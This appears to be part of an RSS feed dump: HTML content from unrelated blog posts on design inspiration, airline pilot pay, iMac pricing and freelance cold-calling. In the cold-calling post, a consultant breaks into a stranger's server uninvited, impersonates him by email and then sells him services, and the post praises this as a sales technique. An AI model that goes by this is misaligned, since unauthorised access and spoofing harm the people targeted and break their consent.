the design phase, collect resources that you will need to complete the design. If your design is inspired by Renaissance art, assemble tutorials on creating old-paper effects, gather some period typography and collect any other textures, symbols, shapes and imagery that could be used in the design.</p>\n<p>What’s great about this part is that even though you’re not actively designing, you’re still putting pieces together that will guide you to the final design. In other words, you’re in the process of brainstorming.</p>\n<h3>4. When To Use Offline Inspiration</h3>\n<p>There is a trend among designers to say that any offline inspiration is okay, but offline and online inspiration need to be balanced.</p>\n<p><a href=\"http://www.flickr.com/photos/mejrmom/1218587253/\"><img src=\"http://media2.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/offlineinspiration.jpg\" width=\"500\" height=\"338\" alt=\"Offline Inspiration\"></a><br><em><a href=\"http://www.flickr.com/photos/mejrmom/1218587253/\">Image source</a></em></p>\n<p>Offline inspiration sources are best for the early phases of a design. They keep you from going straight to CSS galleries the moment a new project begins, only to copy elements of the most original designs. Offline inspiration helps us come up with our own ideas and fall back on our own creativity.</p>\n<h3>5. When To Use Showcases And Galleries</h3>\n<p>Showcases and galleries are not a great source of inspiration early on. Rather, they are great to learn best practices and refine usability and see examples of how specific elements have been implemented. They are useful for turning inspiration into a workable design with solid usability.</p>\n<p><a href=\"http://www.smashingmagazine.com/2009/09/13/showcase-of-music-night-clubs-web-designs/\"><img src=\"http://media1.smashingmagazine.com/wp-content/uploads/images/offline-inspiration/showcase.jpg\" width=\"500\" height=\"456\" alt=\"Showcase\"></a><br><em><a href=\"http://www.smashingmagazine.com/2009/09/13/showcase-of-music-night-clubs-web-designs/\">Showcase of music night clubs web designs</a> here, on Smashing Magazine.</em></p>\n<p>For example, if you’re designing a blog theme, you could look at the styles of various “Read More” links and see which ones have the best effect. You could check out the navigation style of different website types (e.g. portfolio, realty website, Mac application website, etc.). Consistency among certain website elements is a good thing.</p>\n<p>Showcases and galleries can also help generate ideas for style. An app website, for example, obviously wouldn’t look good with a grunge style. Some stylistic choices may not be that obvious, though, and CSS galleries can help us achieve a look that is original yet appropriate.</p>\n<h3>Conclusion</h3>\n<p>As you can see, both offline and online inspiration have their place. Knowing when to use each is the key to getting your creativity back and producing some original work once again. Hopefully, this post has motivated you to take the time to find alternative sources of inspiration.</p>\n<p>We have just briefly touched on methods of finding alternative inspiration. There are, of course, many more. Feel free to share your own habits and techniques for gaining inspiration. The ways are surely endless, and we have to find the one that works best for us.</p>\n<h3>Further Resources</h3>\n<p>You may also be interested in these additional references:</p>\n<ul>\n<li><a href=\"http://webitect.net/design/css-galleries-getting-the-best-out-of-them/\">CSS Galleries – Getting the best out of them</a><br>A contrasting article on how to get the most out of an online form of inspiration, CSS galleries.</li>\n<li><a href=\"http://vandelaydesign.com/blog/design/inspiration-notebook/\">Keep an Inspiration Notebook to Retain Offline Design Inspiration</a><br>Steven Snell shares a great way, in detail, of how he finds and retains inspiration from the offline world.</li>\n<li><a href=\"javascript:void(0);\">How To Find Design Inspiration</a><br>Sitepoints offers a series on methods for finding offline inspiration.</li>\n<li><a href=\"http://sixrevisions.com/resources/10-unusual-places-to-get-design-inspiration/\">10 Unusual Places to Get Design Inspiration</a><br>An article discussing 10 different methods for finding alternative inspiration, and how to effectively draw from it.</li>\n</ul>\n<h4>About the Author</h4>\n<p><em>Kayla Knight is a college student, freelancer and blogger.

      "content" : "<p>\nMichael Moore's <a href=\"http://www.michaelmoore.com/words/must-read/mikes-blog-1-pilots-food-stamps\">pointing out something</a> no one in the media seems to want to discuss: How little money the people who are flying commercial planes are getting paid. As he says, these are not the people you want working a second job:</p>\n<blockquote><p>We're on the descent from 20,000 feet in the air when the flight attendant leans over the elderly woman next to me and taps me on the shoulder.</p>\n<p>\"I'm listening to Lady Gaga,\" I say as I remove just one of the ear buds. I know not this Lady Gaga, but her performance last week on SNL was fascinating.</p>\n<p>\"The pilots would like to see you in the cockpit when we land,\" she says with a southern drawl.</p>\n<p>\"Did I do something wrong?\"</p>\n<p>\"No. They have something to show you.\" (The last time an employee of an airline wanted to show me something it was her written reprimand for eating an in-flight meal without paying for it. \"Yes,\" she said, \"we have to pay for our own meals on board now.\")</p>\n<p>The plane landed and I stepped into the cockpit. \"Read this,\" the first officer said. He handed me a letter from the airline to him. It was headlined \"LETTER OF CONCERN.\" <strong>It seems this poor fellow had taken three sick days in the past year. The letter was a warning not to take another one -- or else.</strong></p>\n<p>\"Great,\" I said. \"Just what I want -- you coming to work sick, flying me up in the air and asking to borrow the barf bag from my seatback pocket.\"</p>\n<p>He then showed me his pay stub. He took home $405 this week. <strong>My life was completely and totally in his hands for the past hour and he's paid less than the kid who delivers my pizza.</strong></p>\n<p>I told the guys that I have a whole section in my new movie about how pilots are treated (using pilots as only one example of how people's wages have been slashed and the middle class decimated). <strong>In the movie I interview a pilot for a major airline who made $17,000 last year. For four months he was eligible -- and received -- food stamps. Another pilot in the film has a second job as a dog walker.</strong></p>\n<p>\"I have a second job!,\" the two pilots said in unison. One is a substitute teacher. The other works in a coffee shop. You know, maybe it's just me, <strong>but the two occupations whose workers shouldn't be humpin' a second job are brain surgeons and airline pilots. Call me crazy.</strong></p>\n<p>I told them about how Capt. \"Sully\" Sullenberger (the pilot who safely landed the jet in the Hudson River) had testified in Congress that <strong>no pilot he knows wants any of their children to become a pilot. Pilots, he said, are completely demoralized. He spoke of how his pay has been cut 40% and his own pension eliminated.</strong> Most of the TV news didn't cover his remarks and the congressmen quickly forgot them. They just wanted him to play the role of \"HERO,\" but he was on a more important mission. He's in my movie.</p>\n<p>\"I hadn't heard anywhere that this stuff about the airlines is in this new movie,\" the pilot said.</p>\n<p>\"No, you wouldn't,\" I replied. \"The press likes to talk about me, not the movie.\"</p>\n<p>And it's true. I've been surprised (and slightly annoyed) that, with all that's been written and talked about \"Capitalism: A Love Story,\" <strong>very little attention has been paid the mind-blowing stuff in the film: pilots on food stamps, companies secretly taking out life insurance policies on employees and hoping they die young so the company can collect, judges getting kickbacks from the private prison industry for sending innocent people (kids) to be locked up. The profit motive -- it's a killer.</strong></p>\n<p>Especially when your pilot started his day at 6am working at the local Starbucks. </p></blockquote><div>\n<a href=\"http://feeds.feedburner.com/~ff/crooksandliars/YaCP?a=V-bELUIVqgo:5WHFC1Cypcw:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/crooksandliars/YaCP?d=yIl2AUoC8zA\" border=\"0\"></a>\n</div>"

      "content" : "<p>The more I think and learn about the <a href=\"http://www.marco.org/218248241\">curious pricing of the 27” iMac</a>, the more bizarre and incredible it seems.</p>\n\n<p>It has a resolution of 2560x1440, which no other monitor in the industry seems to have (that I can find). 30” LCDs are the same width but 1600 tall. Shrinking 2560-wide into a screen that’s 3” smaller diagonally yields an impressive pixel density, especially given the panel’s still-immense size.</p>\n\n<p>It has an IPS panel. IPS is the best and most expensive LCD type, giving the best viewing angle and the least color- and brightness-shifting as the angle increases in any direction. Nearly every panel on the market, including every laptop panel, is the cheap TN type. (TN panels wash out as soon as you move your head slightly, especially vertically, which is why it’s so hard to find a good viewing angle for your laptop lid while watching a dark movie.) Other 27” TN panels exist (only at the lower 1920x1080 resolution), but I can’t find any other 27” IPS panels.</p>\n\n<p>It’s also LED-backlit.</p>\n\n<p>So it’s a very high-specced, brand new panel that’s apparently not being mass-produced yet (since no other monitors for sale are using it). That <em>must</em> be expensive. How much of the base 27” iMac’s $1700 retail cost does this represent?</p>\n\n<p>The closest existing panel for comparison, spec-wise, is the 30” IPS panel that Apple uses in their Cinema Display. It has the ultra-high resolution and size, but doesn’t compete with the 27” iMac’s panel for brightness, contrast, power efficiency, or color range. It’s overpriced by today’s standards at $1800, but not by much — Dell’s original 30” monitor with the same panel is $1200, and a newer version with better specs (although <em>still</em> not as good as the new iMac’s) is $1700.</p>\n\n<p>A standalone monitor with the new iMac’s panel would be perfectly reasonably priced at about $1500. From <em>Dell</em>. Apple’s only charging $200 more than that for theirs, and there’s an <em>entire high-end computer</em> stuck to the back of it.</p>\n\n<p>When they mentioned on last week’s quarterly earnings call that they expected lower profit margins for a new product, I don’t think anyone expected a change of this magnitude. How are they making anything — or even not <em>losing</em> money — with the base-model 27” iMac?</p>\n\n<p>My guess: a massively successful negotiation with the panel’s manufacturer (most likely LG) to get not only an incredible price on these panels, but also apparent exclusivity for a while. It’s a hell of an accomplishment, and presumably a hell of an effort, for a computer that isn’t Apple’s most-selling model (or even product line). That raises a more interesting question: Why?</p>\n\n<p>Until we know why the panel is so cheap, I bet we’re going to see a lot of Mac Pro owners buying 27” monitors for $1700 and trying to figure out what to do with the free computer stuck to the back. For new-computer shopping, a <em>lot</em> of people are going to abandon whichever laptop or Mac Pro they were considering and get this instead.</p>\n\n<p>That helps answer the “why” question: Maybe Apple wants to push more buyers away from today’s default system-type choice — laptops — and show them why they should consider getting a fast, spacious desktop instead. And, for the time being, it’s a desktop with absolutely no equivalent in the PC world.</p>"

But it doesn’t have to be.</p>\n<p><span></span></p>\n<h3><strong>How a Freelancer Sold Me in 5 Minutes</strong></h3>\n<p>I once hired a freelancer based on a cold-call, but this was unlike any cold-call I’d ever gotten.  You might be able to use a similar technique to make those calls far more effective.</p>\n<p>Here’s how the phone call went:</p>\n<p style=\"padding-left:30px\"><em>Caller</em>: Hi, my name is George and I just found a security hole in your server.  To prove it, I just sent an email to you… impersonating you.</p>\n<p style=\"padding-left:30px\"><em>Me</em>: Uhh… wha?  Who are you again?</p>\n<p style=\"padding-left:30px\"><em>Caller</em>: It’s OK, I’m a good guy.  I’ll wait while you check your mail.</p>\n<p style=\"padding-left:30px\"><em>Me</em>: Ok… Alright I got the email.  Wow, that’s not good.</p>\n<p style=\"padding-left:30px\"><em>Caller</em>: Yeah, don’t worry, I can fix it — I’m a security expert.  Lucky for you I’m on your side; a hacker would have just <a href=\"http://www.urbandictionary.com/define.php?term=p0n3d\">p0n3d</a> your server.  You’d be a spam gateway by now, probably blacklisted too.</p>\n<p style=\"padding-left:30px\"><em>Me</em>: Yikes, OK.  Well I guess I should say “thanks” but this feels a little like blackmail.</p>\n<p style=\"padding-left:30px\"><em>Caller</em>: Oh no, I’ll fix this one for free.  In fact, I’ve just emailed you a link to an article on my own blog where I talk about how to fix it.  No worries.</p>\n<p style=\"padding-left:30px\"><em>Me</em>: OK, that’s cool.. I guess.  Thanks?</p>\n<p style=\"padding-left:30px\"><em>Caller</em>: Of course, I <em>am</em> a freelance consultant.  I’m sure you have more security holes.  I could find and fix them for you.  Maybe start with 10 hours and take it from there?</p>\n<p style=\"padding-left:30px\"><em>Me</em>: Sounds like I have no choice… OK.</p>\n<p><strong>Sale complete!</strong></p>\n<h3><strong>How to Apply This to Other Kinds of Freelance Work</strong></h3>\n<p>That’s fine for ex-hackers, but what about you?  Does this apply to, say, copywriting?</p>\n<p>Yes!  It applies to all kinds of freelance work.</p>\n<p>Let’s take the example of a freelance marketing/messaging strategist.</p>\n<p>First troll around websites of local companies looking for companies that clearly stink at messaging.  (You know <em>that</em> won’t be hard.)</p>\n<p>Find a website that’s full of crap like “<a href=\"http://blog.asmartbear.com/the-leading-provider-of-meaningless-marketing-solutions.html\">The leading provider of</a>…” and “Our software enables you to get back to working on what’s important” and other <a href=\"http://blog.asmartbear.com/youre-a-little-company-now-act-like-one.html\">trash phrases that companies shouldn’t be using</a>.  Bleach!  You can do <em>so</em> much better.</p>\n<p>So do it!  Rewrite it.  Maybe even scrape their HTML/CSS/images and edit it in-place so it’s <a href=\"http://freelanceswitch.com/freelance-writing/9-ways-to-make-your-writing-more-compelling/\">punchy, powerful, compelling</a>, and communicates exactly how the product solves pain.</p>\n<p>Then proactively send it over.  The outline of your pitch is:</p>\n<blockquote><p>“This is what I’m capable of after just one hour of work and knowing nothing about your business.  Imagine how I could transform your marketing material with 50 hours and an in-depth understanding of your customers, your software, and how you make money.”</p></blockquote>\n<h3><strong>More Ways to Apply This Strategy</strong></h3>\n<ul>\n<li>I do a little <a href=\"http://blog.asmartbear.com/startup-coaching\">small-business consulting work myself</a>, and this is exactly how I get work.  I just provide 15-20 quick pieces of advice I brainstorm just by perusing their website and say “If this sounds useful to you, I can do more.”</li>\n<li>Web designers: Refresh their colors, layout, and art without changing their text.  Pick their home page, a subordinate page, a brochure, an advertisement, a data sheet, or even something simple like “About Us.”  Provide two different samples so they see the possibilities.  This is a lot of work, so <strong>create two or three standard templates</strong> you use for all your cold-calls, possibly based on existing portfolio work.</li>\n<li>Marketers: Come up with three, better one-line titles and subtitles for their home page.  Revise their “features and bullets” so it’s more pain-centric.  Move them from features to benefits or vice versa.  Change their language to be more or less formal.</li>\n<li>Copyeditors:  Rewrite a web page or a blog post.  Rewrite a single page from a whitepaper or case study.</li>\n<li>Web Traffic Analysts:  Create a sample report for their AdWords or SEO information and send it in.  Show how they rank for various keywords and where you think you could get them.  Show where their competitors rank so they see what they need to beat.</li>\n<li>Social Media Experts:  Propose 10 subjects of blog posts they ought to write.  Propose 10 topics for guest posts they should push on other blogs.  Propose a one-page Twitter strategy (from a template of your own, not yet tailored to that company).</li>\n<li>PR:  Propose 10 types of press releases you could send or types of articles you could write for them.  Propose a one-page PR strategy (from a template) explaining how getting a few articles published in a few places makes all the difference.  Tell them a story about a client of yours who got one article published and make 20 sales.</li>\n<li>Web Programmers:  Give them a list of 10 things you could do to make their site more interactive like live chat, <a href=\"http://prengines.com\">scrolling news boxes</a>, better analytics, and <a href=\"http://blog.asmartbear.com/easy-statistics-for-adwords-ab-testing-and-hamsters.html\">A/B testing</a> of web content and landing pages.</li>\n</ul>\n<h3>The Downside</h3>\n<p>There are several downsides to this strategy:</p>\n<ul>\n<li>This takes real time and real work, and you have to spend that time before this potential client even knows who you are, much less signs a contract.</li>\n<li>They might not have the money for a consultant.</li>\n<li>They might take offense at your unsolicited advice.</li>\n</ul>\n<p>But really, the people you’ll piss off would never be your customer anyway, so that really doesn’t matter.  The main thing is your time.</p>\n<p>So if you’re already covered up with work, there’s no need to use this time-intensive technique, but then why are you reading an article about cold-calling?  :-)</p>\n<p>Especially if you’re just starting out and have a lot of bench time, this technique is certainly worthwhile.</p>\n<p>Because one thing’s for sure: <strong>I hired that hacker.</strong></p>\n<p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/8ht4n8gk25l2l5maofrf5p08g4/300/250?ca=1&amp;fh=280#http%3A%2F%2Ffreelanceswitch.com%2Ffinding%2Fgetting-freelance-work-the-hacker-technique%2F\" width=\"100%\" height=\"280\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=srVkNwkIeOc:LbMYSsvsIZ0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=srVkNwkIeOc:LbMYSsvsIZ0:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=srVkNwkIeOc:LbMYSsvsIZ0:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=srVkNwkIeOc:LbMYSsvsIZ0:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=srVkNwkIeOc:LbMYSsvsIZ0:gIN9vFwOqvQ\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=srVkNwkIeOc:LbMYSsvsIZ0:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=srVkNwkIeOc:LbMYSsvsIZ0:F7zBnMyn0Lo\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=srVkNwkIeOc:LbMYSsvsIZ0:wF9xT3WuBAs\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=srVkNwkIeOc:LbMYSsvsIZ0:wF9xT3WuBAs\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?a=srVkNwkIeOc:LbMYSsvsIZ0:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/FreelanceSwitch?i=srVkNwkIeOc:LbMYSsvsIZ0:D7DqB2pKExk\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/FreelanceSwitch/~4/srVkNwkIeOc\" height=\"1\" width=\"1\">"
